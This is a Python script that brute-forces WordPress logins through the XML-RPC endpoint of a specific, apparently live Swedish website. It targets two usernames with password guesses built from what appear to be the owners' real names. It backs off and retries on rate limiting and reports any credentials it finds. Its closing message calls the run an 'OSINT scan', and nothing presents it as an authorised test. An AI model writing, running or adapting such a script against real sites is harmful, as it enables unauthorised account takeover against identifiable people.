import urllib.request
import urllib.error
import time

url = "https://doktorbajskorv.se/xmlrpc.php"

targets = {
    "nalle": ["nalle", "nalle123", "nalle1", "påhlsson", "pahlsson", "nallepahlsson", "nallepåhlsson", "nallan", "bear"],
    "lompa": ["lompa", "lompa123", "lompa1", "thomas", "andersson", "thomasandersson", "lompathomas"]
}

for user, passwords in targets.items():
    print(f"\n[*] Testing targeted wordlist for user: {user}")
    for pwd in passwords:
        success = False
        while not success:
            xml_data = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{user}</string></value></param>
    <param><value><string>{pwd}</string></value></param>
  </params>
</methodCall>""".encode('utf-8')

            req = urllib.request.Request(
                url, 
                data=xml_data, 
                headers={
                    'Content-Type': 'text/xml',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            try:
                with urllib.request.urlopen(req) as response:
                    res_body = response.read().decode('utf-8')
                    if "faultCode" in res_body:
                        print(f"[-] Failed: {user}:{pwd}")
                    else:
                        print(f"\n[+] SUCCESS! Credentials found -> {user}:{pwd}")
                        exit(0)
                success = True
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    print(f"[!] Rate limited (429) on {user}:{pwd}. Sleeping for 10 seconds...")
                    time.sleep(10)
                else:
                    print(f"[!] HTTP Error {e.code} with {user}:{pwd} - {e.reason}")
                    success = True
            except Exception as e:
                print(f"[!] Error with {user}:{pwd}: {e}")
                success = True
        
        # Standard delay between checks
        time.sleep(4)

print("\n[*] OSINT scan finished.")
